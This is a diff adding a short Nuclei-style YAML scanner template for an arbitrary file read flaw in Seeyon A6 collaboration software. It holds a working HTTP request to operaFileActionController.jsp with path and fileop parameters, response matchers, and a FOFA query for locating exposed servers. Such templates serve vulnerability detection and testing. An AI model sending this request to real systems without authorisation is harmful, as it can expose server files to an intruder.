@@ -1,0 +1,26 @@
+id: seeyon-a6-m-action-operafileactioncontroller-fileread
+
+info:
+  name: 致远 A6 m 协同管理软件 operaFileActionController.jsp - 任意文件读取
+  author: Hugh
+  severity: high
+  description: 
+  reference:
+    - none
+  metadata:
+    verified: true
+    fofa-query: icon_hash="277494963"
+  tags: seeyon,oa,fileread
+
+http:
+  - raw:
+      - |
+        GET /yyoa/portal/style/controller/operaFileActionController.jsp?path=/index.jsp&fileop=find HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'net.btdz.oa.system.fileTransfer.UserFileType')
+        condition: and
